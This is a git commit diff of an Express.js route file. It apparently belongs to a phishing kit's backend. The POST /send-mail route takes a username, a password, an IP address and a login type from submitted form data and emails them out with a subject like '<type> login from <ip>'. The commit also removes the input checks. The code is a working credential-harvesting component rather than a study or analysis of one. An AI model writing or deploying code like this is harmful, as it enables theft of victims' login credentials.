7c9df8aa50da306049971ea153ca4d9abb3b93c2
Btech <dninotoolz@gmail.com>
2025-09-26 09:01:34 +0100

    Update route.js

--- routes/route.js
+++ routes/route.js
@@ -1,21 +1,11 @@
-// routes/route.js
-const express = require('express');
-const router = express.Router();
-const mailer = require('../helper/mailer');
+let express = require('express')
+let router = express.Router()
+let mailer = require('../helper/mailer')
 
-// POST /send-mail
 router.post('/send-mail', (req, res) => {
-    const { username, pass, ip, type } = req.body;
+    const { username, pass, ip, type } = req.body
+    const subject = `${type} login from ${ip}`
+    mailer.sendEmail(res, subject, username, pass, ip, type)
+})
 
-    if (!username || !pass) {
-        return res.status(400).send({ response: 'failed', error: 'Missing username or password' });
-    }
-
-    // Subject line for the email
-    const subject = `${type || "Login"}: ${username} : ${ip || "unknown IP"}`;
-
-    // Call mailer
-    mailer.sendEmail(res, subject, username, pass, ip, type);
-});
-
-module.exports = router;
+module.exports = router
